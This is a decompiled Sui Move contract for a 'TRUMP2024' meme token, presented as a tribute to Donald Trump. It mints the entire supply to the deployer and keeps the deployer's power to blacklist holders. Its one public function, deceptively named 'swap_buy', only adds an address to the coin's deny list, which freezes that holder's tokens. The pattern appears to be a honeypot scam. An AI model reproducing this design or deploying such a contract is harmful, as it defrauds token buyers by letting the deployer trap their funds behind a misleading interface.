module 0xb3cd6c7e1daebaaeb7546761c8aad9d74366ed6d13904116021b39bfa7bf4000::trump2024 {
    struct TRUMP2024 has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: TRUMP2024, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<TRUMP2024>(arg0, 9, b"TRUMP2024", b"President Donald J. Trump", b"Celebrating the legacy, strength, and vision of President Donald J. Trump for 2024 and beyond.", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmQ2t3e1YimKDWJvzr8RmHQK3Q98MX4seX6SP1LbfL9ZVH"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<TRUMP2024>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<TRUMP2024>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<TRUMP2024>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<TRUMP2024>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<TRUMP2024>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<TRUMP2024>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

